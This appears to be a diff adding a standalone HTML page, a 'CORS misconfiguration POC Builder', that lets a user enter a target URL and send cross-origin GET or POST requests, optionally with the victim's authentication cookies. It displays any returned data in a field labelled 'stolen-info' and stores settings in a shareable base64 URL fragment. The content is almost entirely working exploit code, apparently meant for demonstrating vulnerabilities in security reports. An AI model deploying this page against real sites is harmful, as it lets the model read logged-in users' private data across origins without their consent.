@@ -1,0 +1,99 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+<title>CORS POC builder</title>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+
+</head>
+
+<body>
+
+<div class="container">
+<br/>
+<h2>CORS misconfiguration POC Builder</h2>
+<p>
+This is a PoC to demonstrate a CORS misconfiguration vulnerability on <code id="url"></code>.
+</p>
+<h2>Settings</h2>
+<pre>
+<form id="settings" name="settings">
+URL: <input type="text" placeholder="https://example.com" name="url" size="100"><br />
+Custom content type (optional): <input type="text" placeholder="text/plain" name="contenttype" size="100"><br />
+<input type="checkbox" name="authenticated"/> Send CORS with authentication cookies<br />
+<input type="checkbox" name="postreq"/> POST request<br />
+Post data: <input type="text" placeholder="test=demo" name="postdata" size="100"><br />
+<button id="btn-send" class="btn btn-info">Send CORS request</button>
+</form>
+</pre>
+<hr />
+<p>Any information returned due to a lax CORS policy will be printed below:</p>
+<div class="alert alert-info" id="stolen-info"></div>
+
+<div id="footer"><center><hr /><p class="small">Created with &hearts; by <a href="https://twitter.com/honoki">@honoki</a></p></center></div>
+</div>
+ <script>
+
+var config = {}
+
+// Config
+function parseConfig() {
+ var decoded = atob(document.location.hash.substr(1)) || '{}';
+ try {
+  config = JSON.parse(decoded);
+  
+  if(config.url.indexOf('http') !== 0) { config.url = ""; }
+
+  document.forms.settings.url.value = config.url;
+  document.forms.settings.postdata.value = config.postdata;
+  document.forms.settings.contenttype.value = config.contenttype;
+  document.forms.settings.authenticated.checked = config.authenticated ? "checked" : "";
+  document.forms.settings.postreq.checked = config.post ? "checked" : "";
+  url = new URL(config.url);
+  document.getElementById("url").textContent = url.hostname;
+ } catch(e) {
+  console.log(e);
+ }
+}
+
+function htmlEntities(str) {
+    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+function saveConfig() {
+  config = {
+   'url': document.forms.settings.url.value,
+   'contenttype': document.forms.settings.contenttype.value,
+   'postdata': document.forms.settings.postdata.value,
+   'authenticated': document.forms.settings.authenticated.checked,
+   'post': document.forms.settings.postreq.checked
+  }
+  history.replaceState(undefined, undefined, '#'+btoa(JSON.stringify(config)));
+  parseConfig();
+}
+
+function sendCORS(e) {
+  e.preventDefault()
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("stolen-info").innerHTML = htmlEntities(this.responseText);
+    }
+  };
+  var method = config.post ? "POST" : "GET";
+  xhttp.open(method, url, true);
+  if(config.contenttype) {
+  xhttp.setRequestHeader('Content-type', config.contenttype);
+  }
+  xhttp.withCredentials = config.authenticated;
+  if (method === "GET") xhttp.send();
+  if (method === "POST") xhttp.send(config.postdata);
+  return false;
+}
+
+document.getElementById('settings').addEventListener('change', saveConfig);
+document.getElementById('btn-send').addEventListener('click', sendCORS);
+parseConfig();
+</script>
+</body>
+</html>
